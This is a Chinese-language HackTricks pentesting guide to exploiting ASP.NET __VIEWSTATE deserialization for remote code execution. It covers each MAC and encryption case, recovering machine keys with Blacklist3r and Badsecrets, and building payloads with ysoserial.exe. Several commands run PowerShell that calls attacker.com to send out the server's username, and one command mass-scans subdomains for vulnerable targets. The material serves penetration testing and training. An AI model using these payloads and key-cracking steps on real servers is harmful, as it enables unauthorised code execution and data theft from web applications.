# 利用 \_\_VIEWSTATE 在不知道秘密的情况下

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对 **黑客职业** 感兴趣并且想要黑入不可黑入的 - **我们正在招聘！** (_需要流利的波兰语书写和口语_).

{% embed url="https://www.stmcyber.com/careers" %}

## 什么是 ViewState

**ViewState** 是 ASP.NET 框架默认使用的方法，用于在网页之间**保留页面和控件值**。当页面的 HTML 被渲染时，页面的当前状态和需要在回发期间保留的值被序列化成 base64 编码的字符串，并输出在 ViewState 隐藏字段中。\
以下属性或属性组合适用于 ViewState 信息：

* Base64
* 可以通过将 EnableViewStateMac 和 ViewStateEncryptionMode 属性设置为 false 来定义
* Base64 + MAC (消息认证码) 启用
* 可以通过将 EnableViewStateMac 属性设置为 true 来定义
* Base64 + 加密
* 可以通过将 viewStateEncryptionMode 属性设置为 true 来定义

## **测试案例**

![](<../../.gitbook/assets/image (309) (2).png>)

### 测试案例：1 – EnableViewStateMac=false 和 viewStateEncryptionMode=false

通过在以下位置将 `AspNetEnforceViewStateMac` 注册表键设置为零，也可以完全禁用 ViewStateMAC：
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**识别ViewState属性**

您可以尝试通过使用BurpSuite捕获包含此参数的请求来识别ViewState是否受到MAC保护：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

如果没有使用Mac来保护参数，您可以使用[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)来利用它。
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### 测试案例 1.5 – 类似测试案例 1 但服务器没有发送 ViewState cookie

开发者可以**移除 ViewState**，使其不成为 HTTP 请求的一部分（用户不会收到这个 cookie）。\
人们可能会认为，如果**没有 ViewState**，他们的实现就是从任何潜在的 ViewState 反序列化漏洞中**安全**的。\
然而，情况并非如此。如果我们在请求体中**添加 ViewState 参数**并发送我们使用 ysoserial 创建的序列化有效载荷，我们仍然能够实现**代码执行**，如**案例 1**所示。

### 测试案例：2 – .Net < 4.5 且 EnableViewStateMac=true & ViewStateEncryptionMode=false

为了**启用特定页面的 ViewState MAC**，我们需要对特定的 aspx 文件进行以下更改：
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
我们也可以通过在 **web.config** 文件中设置，如下所示，对**整个**应用程序进行此操作：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
由于参数这次受到MAC保护，要成功执行攻击，我们首先需要用到的密钥。在这种情况下，BurpSuite会告诉我们参数受到MAC保护：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

你可以尝试使用[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)来找到使用的密钥。
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) 是另一个可以识别已知 machineKeys 的工具。它是用 Python 编写的，因此与 Blacklist3r 不同，它不依赖 Windows。对于 .NET viewstates，有一个 "python blacklist3r" 工具，这是使用它的最快方式。

它可以直接提供 viewstate 和 generator：
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
```markdown
或者，它可以直接连接到目标URL，并尝试从HTML中提取viewstate：
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

要大规模搜索易受攻击的viewstates，并结合子域名枚举，可以使用`badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md)模块：
```
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

如果你运气好，找到了密钥，你可以使用 [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** 继续进行攻击。
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
在服务器**未发送** `_VIEWSTATEGENERATOR` 参数的情况下，您**不需要**提供 `--generator` 参数，**但需要提供这些参数**：
```bash
--apppath="/" --path="/hello.aspx"
```
### 测试案例：3 - .Net < 4.5 且 EnableViewStateMac=true/false 以及 ViewStateEncryptionMode=true

在这种情况下，Burp无法发现参数是否受到MAC保护，因为它无法识别这些值。然后，该值可能被加密，您将**需要机器密钥来加密您的有效载荷**以利用该漏洞。

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.0.png)

**在这种情况下** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **模块正在开发中...**

**在.NET 4.5之前**，即使设置了**`ViewStateEncryptionMode`**为_**Always**_，ASP.NET也可以**接受**来自用户的**未加密**的\_`__VIEWSTATE`\_参数。ASP.NET **仅检查**请求中**`__VIEWSTATEENCRYPTED`**参数的**存在**。**如果移除此参数，并发送未加密的有效载荷，它仍将被处理。**

因此，如果已知机器密钥（例如，通过目录遍历问题），在**案例2**中使用的[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)命令，可以用来利用ViewState反序列化漏洞执行RCE。

* 从请求中移除`__VIEWSTATEENCRYPTED`参数以利用ViewState反序列化漏洞，否则它将返回一个Viewstate MAC验证错误，并且如图所示，利用将失败：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.1.png)

### 测试案例：4 - .Net >= 4.5 且 EnableViewStateMac=true/false 以及 ViewStateEncryptionMode=true/false 除了两个属性都为false

我们可以通过在web.config文件中指定以下参数来强制使用ASP.NET框架，如下所示。
```markup
<httpRuntime targetFramework="4.5" />
```
```markdown
或者，可以通过在 web.config 文件的 `machineKey` 参数内指定以下选项来实现。
```
```bash
compatibilityMode="Framework45"
```
在之前的案例中，Burp无法识别请求是否受到MAC保护，因为**值是加密的。**然后，为了发送**有效的payload，攻击者需要密钥**。

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

你可以尝试使用[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)来找到正在使用的密钥：
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
有关 IISDirPath 和 TargetPagePath 的更详细描述，请[参考此处](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

或者，使用带有生成器值的 [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)：
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

一旦确认了有效的Machine key，**下一步是使用** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **生成序列化的payload**
```
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
如果您有 `__VIEWSTATEGENERATOR` 的值，您可以尝试使用 `--generator` 参数并带上该值，**省略** `--path` 和 `--apppath` 参数。

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

如果 ViewState 反序列化漏洞被成功利用，一个受攻击者控制的服务器将接收到一个包含用户名的出站请求。[成功利用的 PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### 测试案例 6 – 正在使用 ViewStateUserKeys

**ViewStateUserKey** 属性可以用来**防御** **CSRF 攻击**。如果在应用程序中定义了这样的密钥，并且我们尝试使用到目前为止讨论的方法生成 **ViewState** 负载，**应用程序将不会处理该负载**。\
您需要使用另一个参数来正确创建负载：
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### 成功利用的结果 <a href="#poc" id="poc"></a>

对于所有测试案例，如果ViewState YSoSerial.Net有效载荷**成功**工作，则服务器会响应“**500内部服务器错误**”，响应内容为“**此页面的状态信息无效，可能已损坏**”，我们会收到如下图所示的OOB请求：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

带有当前用户名的带外请求

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## 参考资料

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对**黑客职业**感兴趣，并且想要黑入不可黑入的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
